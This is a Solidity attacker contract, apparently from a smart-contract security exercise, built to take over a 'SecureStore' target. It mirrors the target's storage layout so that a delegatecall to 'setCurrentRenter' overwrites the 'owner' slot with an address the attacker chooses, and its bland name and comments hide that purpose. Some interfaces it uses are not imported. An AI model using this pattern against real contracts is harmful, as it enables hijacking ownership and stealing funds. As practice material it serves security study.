// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "openzeppelin/access/Ownable.sol";
import {usdcErc20} from "src/call-attacks/call-attacks-2/ERC20.sol";
import "src/call-attacks/call-attacks-2/SecureStore.sol";

contract ThisIsNothing {
    address public rentingLibrarySecureStore;
    address public owner;
    uint256 public pricePerDaySecureStore;
    uint256 public rentedUntilSecureStore;

    IERC20 public usdcSecureStore;

    using SafeERC20 for IERC20;

    // renter address => timestamp (until when it's reserved)
    mapping(address => uint256) public renters;

    bytes4 constant setRenterIDFuncSig = bytes4(keccak256("setCurrentRenter(uint256)"));

    //enter a gap of a few bytes here to avoid storage overwrites in delegatecall
    uint256[20] gap;
    usdcErc20 public usdc;
    SecureStore public secureStore;
    uint256 public currentRenter;

    constructor(address _secureStore, address _usdc) {
        usdc = usdcErc20(_usdc);
        secureStore = SecureStore(_secureStore);
    }

    function setCurrentRenter(uint256 _renterId) public returns (bool) {
        owner = address(uint160(uint256(_renterId)));
        return true;
    }
}
